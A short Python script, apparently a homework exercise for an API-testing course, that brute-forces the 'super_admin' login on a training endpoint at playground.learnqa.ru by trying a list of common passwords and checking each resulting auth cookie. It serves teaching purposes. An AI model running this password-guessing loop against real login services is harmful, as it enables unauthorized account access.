import requests
import json

common_passwords = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"]
login = "super_admin"

need_iteration = True
i = 0

while need_iteration:
    current_password = common_passwords[i]
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login":login, "password": current_password})
    cookie = {"auth_cookie": response1.cookies.get('auth_cookie')}

    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies = cookie)
    print(i, current_password, response2.text)

    if response2.text == "You are authorized":
        need_iteration = False
    else:
        i += 1
    if i > len(common_passwords)-1:
        need_iteration = False

if i > len(common_passwords)-1:
    print("пароль не найден")
else:
    print("правильный пароль:", current_password)